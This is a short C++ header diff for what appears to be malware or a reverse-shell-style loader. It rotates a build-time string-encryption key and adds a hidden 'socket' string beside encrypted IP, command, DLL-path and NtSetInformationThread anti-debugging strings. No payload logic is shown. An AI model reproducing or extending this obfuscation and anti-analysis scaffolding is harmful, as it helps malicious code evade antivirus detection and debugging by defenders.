@@ -2,8 +2,8 @@
 
 #include <array>
 
-#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << i) ^ 114)
-static std::array<uint8_t, 16> BUILD_TIME_KEY = { 81, 123, 228, 29, 209, 240, 129, 241, 140, 229, 1, 35, 233, 158, 15, 174 };
+#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << 16) ^ 228)
+static std::array<uint8_t, 16> BUILD_TIME_KEY = { 138, 86, 75, 209, 18, 43, 190, 26, 123, 45, 168, 111, 49, 114, 178, 6 };
 
 extern unsigned char str_ip[];
 extern size_t str_ip_len;
@@ -13,6 +13,9 @@ extern size_t str_cmd_len;
 
 extern unsigned char str_dllPath[];
 extern size_t str_dllPath_len;
+
+extern unsigned char str_socket[];
+extern size_t str_socket_len;
 
 extern unsigned char str_NtSetInformationThread[];
 extern size_t str_NtSetInformationThread_len;
